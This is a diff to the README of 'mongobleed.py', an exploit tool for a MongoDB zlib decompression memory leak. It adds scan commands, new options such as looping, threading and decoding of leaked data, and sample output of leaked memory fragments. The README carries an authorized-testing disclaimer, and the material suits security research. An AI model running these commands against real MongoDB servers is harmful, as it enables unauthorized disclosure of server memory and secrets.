@@ -30,11 +30,17 @@ A flaw in MongoDB's zlib message decompression returns the allocated buffer size
 # Basic scan (offsets 20-8192)
 python3 mongobleed.py --host <target>
 
+# Loop until stopped (Ctrl+C)
+python3 mongobleed.py --host <target> --loop
+
 # Deep scan for more data
 python3 mongobleed.py --host <target> --max-offset 50000
 
 # Custom range
 python3 mongobleed.py --host <target> --min-offset 100 --max-offset 20000
+
+# Decode URL/unicode/base64 previews
+python3 mongobleed.py --host <target> --decode
 ```
 
 ## Options
@@ -45,7 +51,14 @@ python3 mongobleed.py --host <target> --min-offset 100 --max-offset 20000
 | `--port` | 27017 | Target MongoDB port |
 | `--min-offset` | 20 | Minimum document length to probe |
 | `--max-offset` | 8192 | Maximum document length to probe |
-| `--output` | leaked.bin | Output file for leaked data |
+| `--buffer-bump` | 500 | Extra bytes for claimed uncompressed size |
+| `--timeout` | 2.0 | Socket timeout in seconds |
+| `--workers` | `max(4, cpu*10)` | Thread count |
+| `--preview-bytes` | 80 | Bytes to show in console preview |
+| `--max-empty-passes` | 1 | Stop after N passes with no new leaks |
+| `--loop` | false | Keep looping until stopped |
+| `--decode` | false | Decode URL/unicode/base64 previews |
+| `--output` | auto | Output file for leaked data |
 
 ## Example Output
 
@@ -54,14 +67,15 @@ python3 mongobleed.py --host <target> --min-offset 100 --max-offset 20000
 [*] Author: Joe Desimone - x.com/dez_
 [*] Target: localhost:27017
 [*] Scanning offsets 20-50000
+[*] Output: leaked_localhost_27017_20250101_120000.bin
 
-[+] offset=  117 len=  39: ssions^\u0001�r��*YDr���
+[+] offset=  117 len=  39: ssions^\\x01\\xf4r\\x9a\\x2aYDr\\xc3\\x90
 [+] offset=16582 len=1552: MemAvailable:    8554792 kB\nBuffers: ...
 [+] offset=18731 len=3908: Recv SyncookiesFailed EmbryonicRsts ...
 
 [*] Total leaked: 8748 bytes
 [*] Unique fragments: 42
-[*] Saved to: leaked.bin
+[*] Saved to: leaked_localhost_27017_20250101_120000.bin
 ```
 
 ## Test Environment
@@ -97,3 +111,7 @@ Joe Desimone - [x.com/dez_](https://x.com/dez_)
 
 This tool is for authorized security testing only. Unauthorized access to computer systems is illegal.
 
+## Requirements
+
+- Python 3
+- Rich (`pip install rich`)
